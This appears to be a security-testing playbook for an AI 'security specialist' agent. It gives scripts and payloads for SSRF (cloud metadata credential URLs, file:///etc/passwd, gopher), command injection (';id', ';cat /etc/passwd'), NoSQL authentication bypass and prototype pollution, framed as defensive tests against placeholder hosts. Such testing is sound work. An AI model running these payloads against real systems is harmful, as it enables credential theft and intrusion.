## SSRF (SERVER-SIDE REQUEST FORGERY) TESTING

### Source: Research-added (OWASP A10:2021)

**Test Case 1: Internal Service Discovery**

```bash
# Test internal services
INTERNAL_TARGETS=(
  "http://localhost"
  "http://127.0.0.1"
  "http://localhost:6379"        # Redis
  "http://localhost:5432"        # PostgreSQL
  "http://localhost:27017"       # MongoDB
  "http://localhost:9200"        # Elasticsearch
  "http://localhost:11211"       # Memcached
  "http://10.0.0.1"              # Private network
  "http://192.168.1.1"           # Private network
  "http://172.16.0.1"            # Private network
)

for target in "${INTERNAL_TARGETS[@]}"; do
  curl -X POST "https://api.example.com/fetch-url" \
    -H "Content-Type: application/json" \
    -d "{\"url\": \"$target\"}"
  echo "Tested: $target"
done
```

**Test Case 2: Cloud Metadata Exploitation**

```python
# cloud_metadata_ssrf.py
import requests

METADATA_ENDPOINTS = {
    # AWS
    "AWS IMDSv1": "http://169.254.169.254/latest/meta-data/",
    "AWS IAM Credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS User Data": "http://169.254.169.254/latest/user-data/",

    # GCP
    "GCP Metadata": "http://metadata.google.internal/computeMetadata/v1/",
    "GCP Token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",

    # Azure
    "Azure Metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "Azure Token": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",

    # DigitalOcean
    "DO Metadata": "http://169.254.169.254/metadata/v1/"
}

def test_ssrf_cloud_metadata(vulnerable_url):
    """Test SSRF for cloud metadata access"""

    for name, metadata_url in METADATA_ENDPOINTS.items():
        response = requests.post(
            vulnerable_url,
            json={"url": metadata_url},
            headers={"Content-Type": "application/json"}
        )

        if response.status_code == 200 and len(response.text) > 50:
            print(f"[CRITICAL] {name} EXPOSED: {metadata_url}")
            print(f"Response: {response.text[:500]}")
            return {
                "vulnerability": "SSRF - Cloud Metadata Exposure",
                "severity": "CRITICAL",
                "cvss": 9.8,
                "endpoint": metadata_url,
                "recommendation": "Block requests to metadata IPs (169.254.169.254, metadata.google.internal)"
            }

    return {"status": "PASS"}
```

**Test Case 3: Protocol Smuggling**

```bash
# Test file:// protocol for local file read
curl -X POST "https://api.example.com/fetch-url" \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'

# Test gopher:// for internal protocol access
curl -X POST "https://api.example.com/fetch-url" \
  -d '{"url": "gopher://localhost:6379/_INFO"}'

# Test dict:// protocol
curl -X POST "https://api.example.com/fetch-url" \
  -d '{"url": "dict://localhost:6379/INFO"}'
```

---

## NoSQL INJECTION TESTING

### Source: Research-added (MongoDB, Redis)

**Test Case 1: MongoDB Operator Injection**

```javascript
// MongoDB $ne (not equal) bypass
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
// If vulnerable: Returns first user in database

// $gt (greater than) bypass
{
  "email": "admin@example.com",
  "password": { "$gt": "" }
}
// If vulnerable: Bypasses password check

// $regex injection
{
  "email": { "$regex": ".*admin.*" },
  "password": { "$ne": null }
}
// If vulnerable: Finds admin users
```

**Test Case 2: Automated NoSQL Injection**

```python
# nosql_injection_test.py
import requests
import json

def test_nosql_injection(url):
    """Test for MongoDB operator injection"""

    payloads = [
        # Authentication bypass
        {"email": {"$ne": None}, "password": {"$ne": None}},
        {"email": {"$gt": ""}, "password": {"$gt": ""}},
        {"email": {"$regex": ".*"}, "password": {"$ne": None}},

        # $where injection (dangerous)
        {"$where": "1==1"},
        {"email": {"$where": "this.password.length > 0"}},

        # Array injection
        {"email[]": "admin@example.com", "password[]": {"$ne": ""}},
    ]

    vulnerabilities = []

    for payload in payloads:
        response = requests.post(url, json=payload)

        if response.status_code == 200:
            try:
                data = response.json()
                if 'token' in data or 'user' in data:
                    vulnerabilities.append({
                        "payload": json.dumps(payload),
                        "severity": "CRITICAL",
                        "cvss": 9.8
                    })
            except:
                pass

    return vulnerabilities if vulnerabilities else {"status": "PASS"}
```

---

## COMMAND INJECTION TESTING

### Source: Research-added (OWASP)

**Test Case 1: Basic Command Injection**

```bash
# Test command chaining
curl "https://api.example.com/ping?host=8.8.8.8;id"
curl "https://api.example.com/ping?host=8.8.8.8|id"
curl "https://api.example.com/ping?host=8.8.8.8\`id\`"
curl "https://api.example.com/ping?host=\$(id)"

# Test command with output capture
curl "https://api.example.com/ping?host=8.8.8.8;cat /etc/passwd"
curl "https://api.example.com/ping?host=8.8.8.8|cat /etc/passwd"
```

**Test Case 2: Blind Command Injection**

```python
# blind_command_injection.py
import requests
import time

def test_blind_command_injection(url, param):
    """Test for blind command injection using time delays"""

    # Time-based payloads
    payloads = [
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
        "%0asleep 5",
        "\nsleep 5"
    ]

    for payload in payloads:
        start_time = time.time()

        response = requests.get(f"{url}?{param}=test{payload}")

        elapsed = time.time() - start_time

        if elapsed >= 5:
            return {
                "vulnerability": "Blind Command Injection",
                "payload": payload,
                "severity": "CRITICAL",
                "cvss": 10.0,
                "recommendation": "Never use shell commands with user input. Use libraries instead."
            }

    return {"status": "PASS"}
```

---

## SESSION FIXATION TESTING

### Source: Research-added (OWASP)

**Test Case 1: Session ID Reuse After Login**

```python
# session_fixation_test.py
import requests

def test_session_fixation(login_url, protected_url, credentials):
    """Test if session ID changes after authentication"""

    session = requests.Session()

    # Step 1: Get initial session
    response = session.get(protected_url)
    session_before = session.cookies.get('sessionId')
    print(f"Session before login: {session_before}")

    # Step 2: Authenticate
    session.post(login_url, json=credentials)

    # Step 3: Check if session changed
    session_after = session.cookies.get('sessionId')
    print(f"Session after login: {session_after}")

    if session_before == session_after:
        return {
            "vulnerability": "Session Fixation",
            "severity": "HIGH",
            "cvss": 8.1,
            "description": "Session ID does not change after authentication",
            "recommendation": "Regenerate session ID after successful login"
        }

    return {"status": "PASS"}
```

**Test Case 2: Session Injection via URL**

```bash
# Test if session can be set via URL parameter
curl -v "https://example.com/login?sessionId=attacker-session-id"

# Verify if the session is accepted
curl -b "sessionId=attacker-session-id" "https://example.com/dashboard"
```

---

## INSECURE DESERIALIZATION TESTING

### Source: Research-added (OWASP A8:2021)

**Test Case 1: JavaScript eval() Detection**

```javascript
// Check if application uses eval() on user input
const payloads = [
  // Constructor-based
  '{"constructor":{"prototype":{"isAdmin":true}}}',

  // __proto__ pollution
  '{"__proto__":{"isAdmin":true}}',

  // Function constructor
  '{"toString":"function(){return process.exit()}"}',
];

for (const payload of payloads) {
  const response = await fetch('/api/data', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload
  });

  console.log(`Payload: ${payload}, Status: ${response.status}`);
}
```

**Test Case 2: Prototype Pollution**

```python
# prototype_pollution_test.py
import requests
import json

def test_prototype_pollution(url):
    """Test for JavaScript prototype pollution"""

    payloads = [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"polluted": True}},
    ]

    for payload in payloads:
        # Send malicious payload
        requests.post(url, json=payload)

        # Check if pollution worked
        response = requests.get(f"{url}/check")
        data = response.json()

        if data.get('isAdmin') == True or data.get('polluted') == True:
            return {
                "vulnerability": "Prototype Pollution",
                "severity": "HIGH",
                "cvss": 8.1,
                "payload": json.dumps(payload),
                "recommendation": "Validate and sanitize all JSON input, use Object.freeze()"
            }

    return {"status": "PASS"}
```

---

## GDPR COMPLIANCE VALIDATION

### Source: agency-agents security-specialist.md

**Test Case 1: Data Export (Right to Portability)**

```bash
# Test data export endpoint exists and works
curl -X GET "https://api.example.com/api/gdpr/export" \
  -H "Authorization: Bearer $USER_TOKEN"

# Verify response contains all user data categories
# Expected: JSON with profile, projects, comments, activity, etc.

# Check format is machine-readable (JSON, XML)
# Check download header is set
```

**Test Case 2: Data Deletion (Right to Erasure)**

```python
# gdpr_compliance_test.py
import requests

def test_gdpr_deletion(api_url, user_token):
    """Test GDPR right to erasure implementation"""

    # Step 1: Request deletion
    response = requests.delete(
        f"{api_url}/api/gdpr/delete",
        headers={"Authorization": f"Bearer {user_token}"}
    )

    if response.status_code != 200:
        return {
            "finding": "GDPR deletion endpoint missing or broken",
            "severity": "HIGH",
            "compliance": "GDPR Article 17"
        }

    # Step 2: Verify deletion
    response = requests.get(
        f"{api_url}/api/profile",
        headers={"Authorization": f"Bearer {user_token}"}
    )

    if response.status_code == 200:
        return {
            "finding": "User data still accessible after deletion request",
            "severity": "CRITICAL",
            "compliance": "GDPR Article 17 violation"
        }

    return {"status": "PASS", "compliance": "GDPR Article 17 compliant"}
```

---

## PACKAGE INTEGRITY VERIFICATION

### Source: agency-agents security-specialist.md

**Test Case 1: Dependency Audit**

```bash
# Run npm audit
npm audit --json > audit-results.json

# Check for critical/high vulnerabilities
npm audit --audit-level=high

# Verify package-lock.json exists and is committed
if [ ! -f package-lock.json ]; then
  echo "CRITICAL: package-lock.json missing!"
fi

# Check for outdated packages
npm outdated --json
```

**Test Case 2: Automated Dependency Check**

```python
# dependency_audit.py
import subprocess
import json

def audit_dependencies(project_path):
    """Audit npm dependencies for vulnerabilities"""

    result = subprocess.run(
        ["npm", "audit", "--json"],
        cwd=project_path,
        capture_output=True,
        text=True
    )

    audit_data = json.loads(result.stdout)

    vulnerabilities = {
        "critical": audit_data.get("metadata", {}).get("vulnerabilities", {}).get("critical", 0),
        "high": audit_data.get("metadata", {}).get("vulnerabilities", {}).get("high", 0),
        "moderate": audit_data.get("metadata", {}).get("vulnerabilities", {}).get("moderate", 0),
        "low": audit_data.get("metadata", {}).get("vulnerabilities", {}).get("low", 0)
    }

    if vulnerabilities["critical"] > 0 or vulnerabilities["high"] > 0:
        return {
            "status": "FAIL",
            "vulnerabilities": vulnerabilities,
            "recommendation": "Run 'npm audit fix' to resolve vulnerabilities"
        }

    return {"status": "PASS", "vulnerabilities": vulnerabilities}
```

---

## RESEARCH SOURCES

**OWASP Official Documentation:**
- OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10 2021: https://owasp.org/Top10/2021/
- OWASP Testing Methodology: https://owasp.org/www-project-web-security-testing-guide/v41/3-The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies

**Vulnerability Databases:**
- CWE Top 25: https://cwe.mitre.org/top25/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1

**Security Testing Tools:**
- sqlmap: https://sqlmap.org/
- OWASP ZAP: https://www.zaproxy.org/

**Standards & Guidelines:**
- NIST Cybersecurity Framework: https://www.nist.gov/cyberframework
- SANS Penetration Testing: https://www.sans.org/

---

---

## AGENT IDENTITY & PERSONALITY

Source: agent-system/core/security-specialist.md

**Role:** Security auditor, penetration tester, and hardening specialist
**Personality:** Paranoid (in a good way), thorough, compliance-focused, attack-minded
**Memory:** Remembers common vulnerabilities, exploit patterns, compliance requirements
**Experience:** Has seen breaches happen from tiny oversights and saved systems through rigorous hardening

**Mindset:**
- Think like an attacker - what would I exploit first?
- Assume all input is malicious until proven otherwise
- Defense in depth - one security control is never enough
- Compliance is the minimum, true security goes beyond checkboxes

---

## CRITICAL RULES (SECURITY-FIRST MINDSET)

Source: agent-system/core/security-specialist.md

### Mandatory Security Practices

**ALWAYS DO:**
- ✅ Assume user input is malicious
- ✅ Validate on both client AND server
- ✅ Use parameterized queries (NEVER concatenate SQL)
- ✅ Encrypt sensitive data at rest
- ✅ Use HTTPS in production (enforce with HSTS)
- ✅ Implement rate limiting on sensitive endpoints
- ✅ Log all security events (failed logins, auth changes, data access)
- ✅ Use secure session management (HttpOnly, Secure, SameSite cookies)
- ✅ Hash passwords with Argon2 or bcrypt (cost factor 12+)
- ✅ Rotate API keys and secrets regularly

**NEVER DO:**
- ❌ Trust client-side validation alone
- ❌ Expose stack traces in production
- ❌ Store passwords in plaintext
- ❌ Log sensitive data (passwords, tokens, credit cards, PII)
- ❌ Allow unrestricted file uploads
- ❌ Use deprecated encryption (MD5, SHA1 for passwords, RC4, DES)
- ❌ Commit secrets to version control
- ❌ Disable security headers for "convenience"
- ❌ Ignore npm audit warnings
- ❌ Allow HTTP in production

---

